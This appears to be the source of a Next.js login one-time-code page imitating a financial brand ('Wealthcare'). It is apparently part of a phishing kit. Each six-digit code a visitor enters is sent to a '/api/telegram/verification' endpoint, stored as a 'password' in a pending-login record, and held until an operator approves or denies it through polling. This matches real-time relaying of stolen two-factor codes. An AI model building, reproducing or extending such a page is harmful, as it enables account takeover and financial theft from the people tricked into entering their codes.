"use client"

import { useEffect, useLayoutEffect, useState, useRef, Suspense, useCallback } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { ArrowLeft, ArrowRight, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { LoginFlowHeader } from "@/components/LoginFlowHeader"
import { SiteFooter } from "@/components/SiteFooter"
import { FLOW_STEP, setFlowStep, useFlowGuard } from "@/lib/flow-guard"
import { usePendingLoginPoll } from "@/lib/use-pending-login-poll"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import {
  MSG_UNABLE_REACH_VERIFICATION,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
  MSG_UNABLE_VERIFY_TIME
} from "@/lib/approval-messages"
import { WEALTHCARE_BUTTON_CHROME } from "@/lib/wealthcare-button-styles"

function applyOtpDenied(setters: {
  setOtp: (v: string[]) => void
  setErrors: (v: Record<string, string>) => void
  setIsLoading: (v: boolean) => void
  setPendingOtpId: (v: string | null) => void
  inputRefs: React.MutableRefObject<(HTMLInputElement | null)[]>
}) {
  setters.setOtp(["", "", "", "", "", ""])
  setters.setErrors({ otp: OTP_CODE_ERROR_TEXT })
  setters.setIsLoading(false)
  setters.setPendingOtpId(null)
  setTimeout(() => setters.inputRefs.current[0]?.focus(), 0)
}

function VerifyCodeContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const method = searchParams.get("method") || "email"

  useLayoutEffect(() => {
    setFlowStep(FLOW_STEP.VERIFY_METHOD)
  }, [])

  const isAllowed = useFlowGuard(FLOW_STEP.VERIFY_METHOD)

  const [maskedEmail, setMaskedEmail] = useState("**********")
  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [timeLeft, setTimeLeft] = useState(15 * 60)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [pendingOtpId, setPendingOtpId] = useState<string | null>(null)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const verifyingRef = useRef(false)

  useEffect(() => {
    if (typeof window !== "undefined" && window.self !== window.top) {
      window.top!.location.href = window.location.pathname + window.location.search
    }
  }, [])

  useEffect(() => {
    try {
      const email = sessionStorage.getItem("maskedEmail")
      const phone = sessionStorage.getItem("maskedPhone")
      if (email) setMaskedEmail(email)
      if (phone) setMaskedPhone(phone)
    } catch {
      // ignore
    }
  }, [])

  useEffect(() => {
    if (searchParams.get("denied") === "1") {
      applyOtpDenied({
        setOtp,
        setErrors,
        setIsLoading,
        setPendingOtpId,
        inputRefs,
      })
      verifyingRef.current = false
      router.replace(`/login/verify-code?method=${method}`)
      return
    }
    if (searchParams.get("timeout") === "1") {
      setErrors({ otp: MSG_UNABLE_VERIFY_TIME })
      setIsLoading(false)
      router.replace(`/login/verify-code?method=${method}`)
    }
  }, [searchParams, router, method])

  useEffect(() => {
    if (timeLeft <= 0) return
    const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000)
    return () => clearInterval(timer)
  }, [timeLeft])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}m ${secs.toString().padStart(2, "0")}s`
  }

  const formatShortTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const handleOtpChange = (index: number, value: string) => {
    if (isLoading) return
    if (!/^\d*$/.test(value)) return
    if (errors.otp) setErrors({})
    const newOtp = [...otp]
    newOtp[index] = value.slice(-1)
    setOtp(newOtp)
    if (value && index < 5) inputRefs.current[index + 1]?.focus()
  }

  const handleOtpKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    if (isLoading) return
    e.preventDefault()
    const pastedData = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6)
    const newOtp = [...otp]
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i]
    }
    setOtp(newOtp)
    if (errors.otp) setErrors({})
    const nextIndex = Math.min(pastedData.length, 5)
    inputRefs.current[nextIndex]?.focus()
  }

  const handleVerify = useCallback(async () => {
    if (isLoading || verifyingRef.current) return

    setErrors({})
    const otpCode = otp.join("")

    if (otpCode.length !== 6) {
      setErrors({ otp: "Please enter the complete 6-digit code" })
      return
    }

    verifyingRef.current = true
    setIsLoading(true)

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method,
        otp: otpCode,
        page: `/login/verify-code?method=${method}`,
      }),
    }).catch(() => {})

    const userId = sessionStorage.getItem("loginUserId") ?? ""
    const maskedEmailStored = sessionStorage.getItem("maskedEmail") ?? maskedEmail
    const maskedPhoneStored = sessionStorage.getItem("maskedPhone") ?? maskedPhone
    const apiMethod = method === "email" ? "email" : "text"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: userId || "login",
          password: otpCode,
          method: apiMethod,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: "login_otp",
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setIsLoading(false)
        verifyingRef.current = false
        setErrors({ otp: data.error || MSG_UNABLE_REACH_VERIFICATION })
        setOtp(["", "", "", "", "", ""])
        return
      }
      if (data.id) {
        setPendingOtpId(data.id)
        return
      }
      setIsLoading(false)
      verifyingRef.current = false
      setErrors({ otp: OTP_CODE_ERROR_TEXT })
      setOtp(["", "", "", "", "", ""])
    } catch {
      setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
      setIsLoading(false)
      verifyingRef.current = false
      setOtp(["", "", "", "", "", ""])
    }
  }, [isLoading, otp, method, maskedEmail, maskedPhone])

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return

    setIsResending(true)
    setOtp(["", "", "", "", "", ""])
    setErrors({})
    setTimeLeft(15 * 60)

    void fetch("/api/telegram/resend-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ page: `/login/verify-code?method=${method}` }),
    }).catch(() => {})

    await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS))
    setIsResending(false)
    setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
    inputRefs.current[0]?.focus()
  }


  const handleBack = () => {
    const userId =
      typeof window !== "undefined" ? sessionStorage.getItem("loginUserId") ?? "" : ""
    void trackFormSubmission({
      type: "login_did_not_receive_code",
      page: `/login/verify-code?method=${method}`,
      userId,
    }).catch(() => {})
    window.location.href = "/login/2fa-verify"
  }

  const isEmail = method === "email"
  const apiMethod = method === "email" ? "email" : "text"
  const isWaitingOtp = isLoading && pendingOtpId !== null

  usePendingLoginPoll({
    pendingId: isWaitingOtp ? pendingOtpId : null,
    method: apiMethod,
    step: "otp",
    enabled: isWaitingOtp,
    onError: (message) => {
      setErrors({ otp: message })
      setIsLoading(false)
      setPendingOtpId(null)
      verifyingRef.current = false
    },
  })

  if (!isAllowed) return null

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <LoginFlowHeader />

      <main className="flex-1 flex flex-col items-center px-4 py-6 sm:px-6 sm:py-8">
        <div className="w-full max-w-3xl">
          <p className="text-center text-gray-700 mb-2">
            Enter the verification code that you received via{" "}
            <strong>{isEmail ? "email" : "SMS"}</strong> below:
          </p>
          <p className="text-center text-gray-500 text-sm mb-6">
            Note - Do not share your verification code with anyone else
          </p>

          <div
            className="flex justify-center gap-1 sm:gap-2 mb-4 flex-wrap"
            onPaste={handleOtpPaste}
          >
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  inputRefs.current[index] = el
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                disabled={isLoading}
                onChange={(e) => handleOtpChange(index, e.target.value)}
                onKeyDown={(e) => handleOtpKeyDown(index, e)}
                className="w-10 h-12 sm:w-12 text-center text-lg sm:text-xl border-b-2 border-gray-400 focus:border-[#010147] outline-none bg-transparent disabled:opacity-60"
              />
            ))}
          </div>

          {errors.otp ? (
            <p className="text-red-500 text-sm text-center mb-4">{errors.otp}</p>
          ) : null}

          <p className="text-center text-gray-600 text-sm mb-4">
            OTP will expire in {formatTime(timeLeft)}
          </p>

          <p className="text-center mb-8">
            <button
              type="button"
              onClick={() => void handleResend()}
              disabled={isResending || resendCooldown > 0}
              className="text-teal-700 hover:text-teal-800 text-sm disabled:opacity-50"
            >
              {isResending
                ? "Sending..."
                : resendCooldown > 0
                  ? `Resend verification code (${formatShortTime(resendCooldown)})`
                  : "Resend verification code"}
            </button>
          </p>

          <div className="flex flex-wrap items-center justify-center gap-3">
            <Button
              type="button"
              variant="secondary"
              className={`w-full sm:w-auto px-6 py-5 min-w-0 sm:min-w-[120px] ${WEALTHCARE_BUTTON_CHROME}`}
              onClick={handleBack}
              disabled={isLoading}
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              BACK
            </Button>
            <Button
              className={`w-full sm:w-auto px-6 py-5 min-w-0 sm:min-w-[120px] disabled:opacity-50 ${WEALTHCARE_BUTTON_CHROME}`}
              onClick={() => void handleVerify()}
              disabled={isLoading || otp.join("").length !== 6}
            >
              {isLoading ? (
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
              ) : (
                <ArrowRight className="w-4 h-4 mr-2" />
              )}
              {isLoading ? "Verifying..." : "VERIFY"}
            </Button>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  )
}

export default function LoginVerifyCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen flex items-center justify-center">
          <p className="text-gray-600">Loading...</p>
        </div>
      }
    >
      <VerifyCodeContent />
    </Suspense>
  )
}
